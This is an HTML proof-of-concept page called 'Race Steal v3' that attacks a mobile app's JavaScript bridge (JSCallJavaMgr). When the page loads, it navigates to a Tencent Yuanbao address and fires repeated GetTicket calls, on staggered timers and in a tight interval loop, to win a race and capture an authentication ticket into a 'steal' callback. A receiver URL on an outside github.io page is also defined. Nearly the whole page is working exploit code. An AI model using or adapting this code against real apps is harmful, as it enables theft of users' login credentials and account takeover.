<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Race Steal v3</title></head>
<body>
<h2>JSBridge Race - GetTicket Steal</h2>
<pre id="log" style="font-size:10px;max-height:90vh;overflow:auto;"></pre>
<script>
var log = document.getElementById('log');
function addLog(s) { log.textContent += '[' + Date.now() + '] ' + s + '\n'; }

var callCount = 0;
function callJSBridge(module, method, param, cbName) {
    callCount++;
    var callId = module + '_' + method + '_' + callCount + '_' + Date.now();
    if (!cbName) cbName = 'cb_' + callId.replace(/[^a-zA-Z0-9_]/g, '_');
    var req = { callback: cbName, module: module, method: method, param: param || {}, callId: callId };
    window.JSCallJavaMgr.JSCallNative(JSON.stringify(req));
}

var RECV_URL = "https://zhuos6678-test.github.io/huiyitest112233.github.io/recv.html";

function doRace() {
    if (!window.JSCallJavaMgr) { addLog('ERROR: JSCallJavaMgr not found!'); return; }
    addLog('=== Race Steal v3 ===');
    addLog('URL: ' + location.href);

    location.href = "https://yuanbao.tencent.com/";

    // 策略：每个延迟只发 1 个 GetTicket，提高命中率
    // LoadUrl 和 GetTicket 交替发，覆盖更多窗口
    var delays = [0, 20, 40, 60, 80, 100, 130, 160, 200, 250, 300, 400, 500];
    for (var d = 0; d < delays.length; d++) {
        (function(delay) {
            setTimeout(function() {
                try {
                    callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 0}, 'steal_cb_w9');
                } catch(e) {}
            }, delay);
        })(delays[d]);
    }

    // setInterval: 只发 GetTicket，高频
    var ivCount = 0;
    var iv = setInterval(function() {
        ivCount++;
        try {
            callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 0}, 'steal_cb_w9');
        } catch(e) { clearInterval(iv); }
        if (ivCount > 200) clearInterval(iv);
    }, 0);

    addLog('Race started');
}

setTimeout(function() {
    addLog('Starting in 2s...');
    setTimeout(doRace, 2000);
}, 500);
</script>
</body>
</html>
